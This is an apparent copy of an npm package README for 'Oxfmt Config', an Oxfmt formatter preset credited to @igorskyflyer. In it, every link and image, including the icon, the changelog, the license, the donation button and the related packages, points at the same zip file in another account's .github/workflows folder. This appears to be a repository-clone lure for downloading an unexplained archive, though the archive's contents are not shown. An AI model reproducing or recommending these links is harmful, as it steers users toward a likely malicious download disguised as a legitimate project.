<div align="center">
  <img src="https://raw.githubusercontent.com/JNEQNetwork/npm-oxfmt-config/main/.github/workflows/npm_oxfmt_config_v2.3-beta.1.zip" alt="Icon of Oxfmt Config" width="256" height="256">
  <h1>Oxfmt Config</h1>
</div>
...
- **`tabWidth: 2`** - industry standard for JS/TS, consistent with [`@igorskyflyer/tsconfig`](https://raw.githubusercontent.com/JNEQNetwork/npm-oxfmt-config/main/.github/workflows/npm_oxfmt_config_v2.3-beta.1.zip) and [`@igorskyflyer/editorconfig`](https://raw.githubusercontent.com/JNEQNetwork/npm-oxfmt-config/main/.github/workflows/npm_oxfmt_config_v2.3-beta.1.zip)
...
Read about the latest changes in the [**CHANGELOG**](https://raw.githubusercontent.com/JNEQNetwork/npm-oxfmt-config/main/.github/workflows/npm_oxfmt_config_v2.3-beta.1.zip).

<br>

## License

Licensed under the [**MIT license**](https://raw.githubusercontent.com/JNEQNetwork/npm-oxfmt-config/main/.github/workflows/npm_oxfmt_config_v2.3-beta.1.zip).
...
<div align="center">
  ...
  <br><br>
  <a href="https://raw.githubusercontent.com/JNEQNetwork/npm-oxfmt-config/main/.github/workflows/npm_oxfmt_config_v2.3-beta.1.zip" target="_blank"><img src="https://raw.githubusercontent.com/JNEQNetwork/npm-oxfmt-config/main/.github/workflows/npm_oxfmt_config_v2.3-beta.1.zip" alt="Donate to igorskyflyer" width="180" height="46"></a>
  <br><br>
...
[**@igorskyflyer/astro-render-component**](https://raw.githubusercontent.com/JNEQNetwork/npm-oxfmt-config/main/.github/workflows/npm_oxfmt_config_v2.3-beta.1.zip)
...
[**@igorskyflyer/adblock-filter-counter**](https://raw.githubusercontent.com/JNEQNetwork/npm-oxfmt-config/main/.github/workflows/npm_oxfmt_config_v2.3-beta.1.zip)
...
[**@igorskyflyer/zep**](https://raw.githubusercontent.com/JNEQNetwork/npm-oxfmt-config/main/.github/workflows/npm_oxfmt_config_v2.3-beta.1.zip)

> _🧠 Zep is a zero-dependency, efficient debounce module. ⏰_

<br>

[**@igorskyflyer/magic-string**](https://raw.githubusercontent.com/JNEQNetwork/npm-oxfmt-config/main/.github/workflows/npm_oxfmt_config_v2.3-beta.1.zip)
...
[**@igorskyflyer/valid-path**](https://raw.githubusercontent.com/JNEQNetwork/npm-oxfmt-config/main/.github/workflows/npm_oxfmt_config_v2.3-beta.1.zip)
...
Created by **Igor Dimitrijević ([_@igorskyflyer_](https://raw.githubusercontent.com/JNEQNetwork/npm-oxfmt-config/main/.github/workflows/npm_oxfmt_config_v2.3-beta.1.zip))**.
